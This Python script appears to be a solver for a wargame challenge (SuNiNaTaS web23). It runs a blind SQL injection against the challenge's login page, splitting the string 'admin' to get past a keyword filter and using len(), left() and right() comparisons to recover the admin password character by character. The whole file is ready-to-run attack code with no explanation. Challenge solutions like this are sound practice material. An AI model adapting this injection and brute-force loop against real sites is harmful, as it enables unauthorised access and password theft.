import requests

url = 'http://suninatas.com/Part_one/web23/web23.asp'
cookies = {
    'ASPSESSIONIDSCCTQBTQ': ''
}
payloads = {
    'id': '',
    'pw': ''
}

len_of_pw = 0
for i in range(100):
    sqli = 'ad\'+\'min\' and len(pw)=%d--' % i
    payloads['id'] = sqli
    payloads['pw'] = '1234'
    res = requests.get(url, cookies=cookies, params=payloads)
    res = res.text.split('\r\n')
    res = res[31].split('\t')
    res = res[-1]
    print(res)
    if res.find('admin') > -1:
        len_of_pw = i
        break
        
print('The length of password is ', i)

straight_pw = ''
for i in range(32, 127):
    sqli = 'ad\'+\'min\' and left(pw,1)=\'%s\'--' % (chr(i))
    payloads['id'] = sqli
    payloads['pw'] = '1234'
    res = requests.get(url, cookies=cookies, params=payloads)
    res = res.text.split('\r\n')
    res = res[31].split('\t')
    res = res[-1]
    print(sqli, len(sqli), res)
    if res.find('admin') > -1:
        straight_pw += chr(i)
        break
print('The first letter of password is ', straight_pw)

for x in range(2, int(len_of_pw/2)+1):
    for i in range(32, 127):
        straight_pw += chr(i)
        sqli = '\' or left(pw,%d)=\'%s\'--' % (x, straight_pw)
        payloads['id'] = sqli
        payloads['pw'] = '1234'
        res = requests.get(url, cookies=cookies, params=payloads)
        res = res.text.split('\r\n')
        res = res[31].split('\t')
        res = res[-1]
        print(sqli, len(sqli), res)
        if res.find('admin') > -1:
            break
        straight_pw = straight_pw[:-1]
    print(straight_pw)

from_right_pw = ''
for i in range(32, 127):
    sqli = '\' or right(pw,1)=\'%s\'--' % (chr(i))
    payloads['id'] = sqli
    payloads['pw'] = '1234'
    res = requests.get(url, cookies=cookies, params=payloads)
    res = res.text.split('\r\n')
    res = res[31].split('\t')
    res = res[-1]
    print(sqli, len(sqli), res)
    if res.find('admin') > -1:
        from_right_pw += chr(i)
        break
print('The last letter of password is ', from_right_pw)

for x in range(2, int(len_of_pw/2)+1):
    for i in range(32, 127):
        from_right_pw  = chr(i) + from_right_pw
        sqli = '\' or right(pw,%d)=\'%s\'--' % (x, from_right_pw)
        payloads['id'] = sqli
        payloads['pw'] = '1234'
        res = requests.get(url, cookies=cookies, params=payloads)
        res = res.text.split('\r\n')
        res = res[31].split('\t')
        res = res[-1]
        print(sqli, len(sqli), res)
        if res.find('admin') > -1:
            break
        from_right_pw = from_right_pw[1:]
    print(from_right_pw)

final_pw = straight_pw+from_right_pw
    
print('The password is ', final_pw.lower())
